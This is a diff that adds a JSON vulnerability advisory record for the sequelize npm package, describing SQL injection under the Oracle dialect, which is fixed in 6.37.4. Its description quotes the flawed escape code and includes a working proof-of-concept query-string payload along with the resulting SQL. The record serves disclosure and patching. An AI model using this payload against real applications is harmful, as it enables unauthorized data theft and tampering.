@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-08-03T20:29:52Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "sequelize"
+  },
+  "Advisory": {
+    "DatabaseId": 397772,
+    "Id": "GSA_kwCzR0hTQS12OGZnLTJydzctcTQ1Ms4ABhHM",
+    "GhsaId": "GHSA-v8fg-2rw7-q452",
+    "References": [
+      {
+        "Url": "https://github.com/sequelize/sequelize/security/advisories/GHSA-v8fg-2rw7-q452"
+      },
+      {
+        "Url": "https://github.com/sequelize/sequelize/commit/5deadd2410ae9136a21fb652db206d27bb715f26"
+      },
+      {
+        "Url": "https://github.com/sequelize/sequelize/releases/tag/v6.37.4"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-v8fg-2rw7-q452"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-v8fg-2rw7-q452"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-69240"
+      }
+    ],
+    "Description": "### Summary\nSQL Injection is possible with strings only **if dialect is set to `oracle`**.\nThe vulnerability was confirmed on Sequelize v6.37.3.\n\n### Details\nThe `escape` function defined in `sql-string.js` does not escape quotes if the value starts with `TO_TIMESTAMP` or `TO_DATE`.\n\n```javascript\n  } else if (dialect === 'oracle' \u0026\u0026 typeof val === 'string') {\n    if (val.startsWith('TO_TIMESTAMP') || val.startsWith('TO_DATE')) {\n      return val;\n    }\n    val = val.replace(/'/g, \"''\");\n  }\n```\n\n### PoC\nSuppose the application has the following code:\n\n```javascript\n  var result = await models.Student.findOne({\n    where: {\n      firstName: req.query.firstName\n    }\n  });\n```\n\nAn attacker can inject arbitrary sql expressions.\n\n`http://host/path?firstName=TO_DATE('0','Y')||'' OR 1=1--`\n\nThe resulted SQL will be:\n\n```SQL\nSELECT ... WHERE \"Student\".\"firstName\" = TO_DATE('0','Y')||'' OR 1=1-- ORDER BY \"Student\".\"id\" OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY;\n```\n\n### Impact\nData theft and tampering.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-08-03T20:29:50Z",
+    "Severity": "CRITICAL",
+    "Summary": "Sequelize: SQL Injection (Oracle DB)",
+    "UpdatedAt": "2026-08-03T20:29:52Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "6.37.4"
+      },
+      "VulnerableVersionRange": "\u003c 6.37.4"
+    }
+  ]
+}
